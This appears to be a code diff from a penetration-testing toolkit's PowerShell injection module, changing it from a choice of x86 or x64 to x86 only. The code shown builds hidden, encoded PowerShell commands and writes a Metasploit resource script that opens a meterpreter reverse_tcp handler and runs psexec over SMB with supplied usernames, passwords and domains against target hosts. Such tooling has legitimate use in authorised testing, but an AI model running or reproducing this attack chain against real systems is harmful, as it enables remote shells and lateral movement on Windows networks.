@@ -51,30 +51,19 @@ try:
     if not os.path.isdir(setdir + "/reports/powershell"):
        os.makedirs(setdir + "/reports/powershell")
 
-    # here we format everything for us
-    x64 = file(setdir + "/x64.powershell", "r")
-    x64 = x64.read()
-    x64 = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + x64
     x86 = file(setdir + "/x86.powershell", "r")
     x86 = x86.read()
     x86 = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + x86
     print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
-    filewrite = file(setdir + "/reports/powershell/x64_powershell_injection.txt", "w")
-    filewrite.write(x64)
-    filewrite.close()
     filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
     filewrite.write(x86)
-    victim=raw_input(setprompt(["32"], "What operating system do you want to target x86 or x64 [x64]"))
-    if victim == "x86":
-        payload = "windows/meterpreter/reverse_tcp\n" # if we are using x86
-        command = x86 # assign powershell to command
-    else:
-        payload = "windows/x64/meterpreter/reverse_tcp" # if we are using x64
-        command = x64 # assign powershell to command
+    filewrite.close()
+    payload = "windows/meterpreter/reverse_tcp\n" # if we are using x86
+    command = x86 # assign powershell to command
 
     # write out our answer file for the powershell injection attack
     filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
-    filewrite.write("use multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nexploit\n" % (port,rhosts,username,password,domain,threads,command))
+    filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nexploit\n" % (port,rhosts,username,password,domain,threads,command))
     filewrite.close()
     msf_path = meta_path()
     # launch metasploit below
